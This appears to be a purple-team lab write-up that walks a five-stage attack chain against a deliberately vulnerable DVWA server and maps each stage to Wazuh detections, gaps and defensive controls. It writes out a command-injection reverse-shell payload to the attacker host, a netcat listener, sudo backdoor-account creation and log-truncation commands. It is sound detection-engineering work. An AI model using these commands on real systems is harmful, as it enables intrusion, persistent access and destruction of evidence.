# Purple Team Simulation: Attack Chain — Forgotten Service
## T1046 → T1190 → T1059.004 → T1136.001 → T1070.002

## Overview

| Field | Value |
|---|---|
| Scenario Name | Forgotten Service |
| MITRE Tactics | Discovery, Initial Access, Execution, Persistence, Defense Evasion |
| Attacker | kali01 — 10.10.10.20 |
| Target | target01 — 10.10.10.30 |
| Gateway | fw01 — 10.10.10.1 |
| SIEM | Wazuh on node03 — 192.168.178.28 |
| Date | 2026-06-23 |
| Result | In Progress |

---

## Scenario Description

A web application (DVWA) is running on an internal server in an isolated network zone. The application was deployed for testing and never hardened — default credentials were never changed, the security level was left unconfigured, and no firewall rules restrict access to it from within the attack zone.

An attacker who has gained a foothold in the attack zone (simulating a compromised machine or insider threat) discovers the service, logs in with default credentials, and exploits a command injection vulnerability to establish a reverse shell. Once inside, they create a backdoor account for persistent access, then attempt to cover their tracks by clearing authentication logs.

This scenario simulates a realistic post-compromise attack chain against a forgotten or misconfigured internal service — a common finding in real-world penetration tests and incident investigations.

---

## Attack Chain Overview

    T1046     Network scan — discover target01 and open services
         │
         ▼
    T1190     Exploit DVWA with default credentials (admin/password)
         │
         ▼
    T1059.004 Command injection executes reverse shell back to kali01
         │
         ▼
    T1136.001 Create backdoor local Linux account for persistent access
         │
         ▼
    T1070.002 Clear authentication logs to cover tracks

---

## Prerequisites

- kali01 running on the attack zone (10.10.10.20)
- target01 running with DVWA installed and Apache running (10.10.10.30)
- DVWA security level set to low
- Wazuh agent active on target01
- auditd running on target01

---

## Stage 1 — T1046: Network Scan

### What This Technique Is

Network scanning is how an attacker maps the environment after gaining initial access to a network segment. By sending probes to a range of IP addresses and ports, the attacker discovers which hosts are alive and what services they expose. This is typically one of the first actions taken after gaining a foothold.

### Attack

From kali01, scan the attack zone to discover live hosts and open services:

    sudo nmap -sV -sC 10.10.10.0/24

| Flag | Meaning |
|---|---|
| `-sV` | Version detection — identify what software is running on each port |
| `-sC` | Default scripts — run common enumeration scripts |
| `10.10.10.0/24` | Scan the entire attack zone subnet |

### Expected Output

    Nmap scan report for 10.10.10.30
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 9.6p1
    80/tcp open  http    Apache httpd 2.4.58

Port 80 reveals an Apache web server — follow up with a targeted scan:

    sudo nmap -sV -p 80 --script http-enum 10.10.10.30

The `http-enum` script discovers common web application paths, revealing `/dvwa/` in the results.

### Detection

Wazuh is host-based and cannot see network traffic directly. This stage will not generate alerts in Wazuh. A network sensor (Suricata on fw01) would detect the port scan — this is a gap in the current detection coverage.

---

## Stage 2 — T1190: Exploit Public-Facing Application

### What This Technique Is

Many web applications ship with default credentials that administrators never change. An attacker who discovers a login page will always try common defaults before attempting anything more sophisticated. DVWA's default credentials (`admin` / `password`) are publicly documented and will succeed against any unmodified installation.

### Attack

Open a browser or use curl from kali01 to access DVWA:

    http://10.10.10.30/dvwa/login.php

Log in with default credentials:

| Field | Value |
|---|---|
| Username | admin |
| Password | password |

Alternatively via curl (requires CSRF token — see prerequisites):

    # Get login page token
    curl -s -c /tmp/dvwa_cookies.txt http://10.10.10.30/dvwa/login.php | grep "user_token"

    # Login with token
    curl -s -c /tmp/dvwa_cookies.txt -b /tmp/dvwa_cookies.txt \
      -X POST http://10.10.10.30/dvwa/login.php \
      --data "username=admin&password=password&Login=Login&user_token=TOKEN_HERE" \
      -D - | grep "Location"

A redirect to `index.php` confirms successful authentication.

### Detection

DVWA login attempts are not captured by auditd (kernel-level) or auth.log (SSH/sudo only). Apache access logs on target01 record the HTTP requests but Wazuh is not configured to ingest Apache logs by default. This is a detection gap — adding Apache log monitoring to the Wazuh agent config would close it.

---

## Stage 3 — T1059.004: Command Injection Reverse Shell

### What This Technique Is

DVWA's Command Execution module takes user input and passes it directly to a system shell command without sanitisation. At security level `low`, there is no filtering whatsoever — any shell metacharacter (`;`, `|`, `&&`) appended to the input will cause additional commands to execute on the server.

A reverse shell is a connection initiated by the victim machine back to the attacker. The attacker listens on a port; the victim runs a command that connects back and hands over an interactive shell. This is the standard technique for converting command injection into full shell access.

### How the Injection Works

The DVWA ping command runs something equivalent to:

    ping -c 4 [USER_INPUT]

By injecting `;bash -i >& /dev/tcp/10.10.10.20/4444 0>&1` after a valid IP, the server executes:

    ping -c 4 127.0.0.1;bash -i >& /dev/tcp/10.10.10.20/4444 0>&1

The `;` ends the ping command. The `bash -i` opens an interactive shell. The `>& /dev/tcp/10.10.10.20/4444` redirects stdin, stdout, and stderr over a TCP connection to kali01 on port 4444. The attacker receives a live shell running as `www-data`.

### Attack

**Step 1 — Set up listener on kali01:**

    nc -lvnp 4444

| Flag | Meaning |
|---|---|
| `-l` | Listen for incoming connections |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p 4444` | Listen on port 4444 |

**Step 2 — Execute injection via curl:**

    # Get exec page token (must be logged in)
    curl -s -m 10 -c /tmp/dvwa_cookies.txt -b /tmp/dvwa_cookies.txt \
      http://10.10.10.30/dvwa/vulnerabilities/exec/ | grep "user_token"

    # Submit injection payload
    curl -s -m 10 -c /tmp/dvwa_cookies.txt -b /tmp/dvwa_cookies.txt \
      -X POST http://10.10.10.30/dvwa/vulnerabilities/exec/ \
      --data "ip=127.0.0.1%3Bbash+-i+>%26+/dev/tcp/10.10.10.20/4444+0>%261&Submit=Submit&user_token=TOKEN_HERE"

The netcat listener on kali01 receives a shell running as `www-data` on target01.

**Step 3 — Verify shell access:**

    id
    hostname
    whoami

Expected output:

    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    target01
    www-data

### Detection

auditd on target01 captures the `execve` syscall when bash spawns. The Wazuh agent forwards this to node03. Custom rule 100003 fires because the process has an interactive TTY (`pts/X`).

| Rule ID | Level | Description |
|---|---|---|
| 100003 | 14 | Interactive process execution detected via auditd |

Alert fields:

| Field | Value |
|---|---|
| `rule.id` | 100003 |
| `audit.exe` | /usr/bin/bash |
| `audit.tty` | pts0 |
| `audit.execve.a2` | bash -i >& /dev/tcp/10.10.10.20/4444 0>&1 |
| `agent.name` | target01 |

The full reverse shell command including the attacker IP and port is visible in the alert.

---

## Stage 4 — T1136.001: Create Local Account

### What This Technique Is

After establishing a foothold, attackers create backdoor accounts to ensure persistent access even if the original vulnerability is patched or the web shell is discovered. A local Linux account with sudo access provides reliable re-entry.

### Attack

From the reverse shell on target01 (running as `www-data`):

    sudo useradd -m -s /bin/bash backdoor
    sudo passwd backdoor
    sudo usermod -aG sudo backdoor

This creates a user `backdoor` with a home directory, bash shell, and sudo privileges.

Verify:

    id backdoor
    cat /etc/passwd | grep backdoor

### Detection

User creation via `useradd` generates an entry in `/var/log/auth.log` and is captured by auditd. Wazuh has built-in rules for account creation events.

| Rule ID | Level | Description |
|---|---|---|
| 5902 | 8 | New user added to the system |

Additionally rule 100003 fires again on the `useradd` execve call since it runs interactively.

---

## Stage 5 — T1070.002: Clear Linux Logs

### What This Technique Is

After completing their objectives, attackers attempt to remove evidence of their presence. On Linux systems, authentication logs (`/var/log/auth.log`) and audit logs (`/var/log/audit/audit.log`) contain records of every action taken. Clearing these files removes the evidence trail — or so the attacker hopes.

### Attack

From the reverse shell on target01:

    sudo truncate -s 0 /var/log/auth.log
    sudo truncate -s 0 /var/log/audit/audit.log
    sudo truncate -s 0 /var/log/syslog

### Detection

This is where the layered detection architecture proves its value. Even though the local logs on target01 are cleared, the Wazuh agent had already forwarded log events to the Wazuh manager on node03 in real time. Clearing local logs does not affect events already shipped to the SIEM.

Additionally, the truncation itself is an auditable event captured by auditd before the log is cleared, and Wazuh has a built-in rule for log clearing:

| Rule ID | Level | Description |
|---|---|---|
| 591 | 8 | Log file cleared |

The attempt to cover tracks is itself detected.

---

## Detection Summary

| Stage | Technique | Detected | Rule | Gap |
|---|---|---|---|---|
| 1 — Network scan | T1046 | No | None | No network sensor on fw01 |
| 2 — Default credentials | T1190 | No | None | Apache logs not ingested by Wazuh |
| 3 — Reverse shell | T1059.004 | Yes | 100003 | None |
| 4 — Backdoor account | T1136.001 | Yes | 5902, 100003 | None |
| 5 — Log clearing | T1070.002 | Yes | 591 | None |

---

## Detection Gaps and Recommendations

### Gap 1 — Network scanning not detected (T1046)
Deploy Suricata on fw01 in IDS mode on the eth1 interface (attack zone). Suricata's port scan detection rules would alert on the nmap scan before the attacker reaches the web application. This is Phase 7 of the lab roadmap.

### Gap 2 — Web application login not detected (T1190)
Configure the Wazuh agent on target01 to ingest Apache access logs (`/var/log/apache2/access.log`). A custom rule matching `POST /dvwa/login.php` with a 302 response would detect successful logins. Failed login attempts would also be visible.

### Gap 3 — Reverse shell egress not detected at network level
The reverse shell connection from target01 to kali01 on port 4444 passes through fw01 and is allowed by the current nftables rules (attack zone to internet/WAN is permitted). Suricata on fw01 would detect this as an anomalous outbound connection. Alternatively, nftables could be tightened to only allow specific outbound ports from the attack zone.

---

## Defensive Controls

| Control | Effect |
|---|---|
| Change default DVWA credentials | Prevents T1190 entirely |
| Disable DVWA command execution module | Prevents T1059.004 |
| Run Apache as a non-privileged user without sudo | Limits T1136.001 — www-data cannot create users without sudo |
| Suricata on fw01 | Detects T1046 and reverse shell egress |
| Apache log ingestion in Wazuh | Detects T1190 |
| Wazuh active response | Auto-block attacker IP when rule 100003 fires |

---

## Sigma Rules

Sigma rules for T1059.004 and T1070.002 are in `detections/sigma/`. T1046 and T1190 require network-level detection (Suricata) which is planned for Phase 7.
